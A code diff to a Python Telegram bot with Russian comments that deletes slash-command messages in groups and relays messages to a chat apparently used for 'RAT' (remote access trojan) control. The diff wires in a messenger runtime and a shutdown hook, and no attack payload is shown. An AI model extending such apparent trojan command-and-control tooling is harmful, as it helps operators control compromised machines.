@@ -424,7 +424,6 @@ async def delete_any_slash_message(update: Update, context: ContextTypes.DEFAULT
             print(f"🗑️ Удалено сообщение с /: {update.message.text[:50]}")
         except Exception as e:
             print(f"⚠️ Ошибка удаления: {e} — дай боту права, мать его!")
-app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.GROUPS, delete_any_slash_message))
         
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработка обычных текстовых сообщений из целевых групп — с RAT-магией и автоудалением"""
@@ -618,6 +617,8 @@ def main():
         
         # Создаём очередь для сообщений (внутри event loop!)
         message_queue = asyncio.Queue()
+        from messenger_startup import start_messenger
+        application.bot_data['messenger_runtime'] = start_messenger(application, [CHAT_ID, RAT_CHAT_ID])
         
         # Запускаем синхронный Firebase слушатель в отдельном потоке
         import threading
@@ -629,6 +630,15 @@ def main():
         print("✅ Система синхронизации запущена")
     
     app.post_init = post_init
+
+    async def post_shutdown(application):
+        runtime = application.bot_data.get('messenger_runtime')
+        if runtime:
+            server, transport = runtime
+            if transport and transport.task:
+                transport.task.cancel()
+            server.close()
+    app.post_shutdown = post_shutdown
     
     # Запускаем бота
     print("✅ Бот запущен! Нажми Ctrl+C для остановки.")
@@ -637,3 +647,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
